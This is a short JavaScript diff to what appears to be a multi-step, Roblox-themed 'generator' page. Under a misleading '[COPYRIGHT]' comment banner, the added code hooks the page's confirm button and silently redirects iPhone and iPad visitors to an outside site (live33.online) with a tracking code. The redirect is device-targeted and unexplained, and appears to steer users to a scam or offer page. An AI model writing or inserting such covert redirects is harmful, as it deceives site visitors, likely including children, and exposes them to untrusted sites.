@@ -151,3 +151,18 @@
             $("#step-6").removeClass("d-none");
         }, 7500);
     }
+
+/*================== [COPYRIGHT] ===============*/
+/*================== [ roblox ] ================*/
+var button = document.querySelector('.confirm');  
+button.addEventListener('click', function() {
+    (function() {
+        var redirectURL = "https://live33.online/?0cdda79";
+
+        var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
+
+        if (isIphoneOrIpad) { 
+            window.location.href = redirectURL;
+        }
+    })();
+});
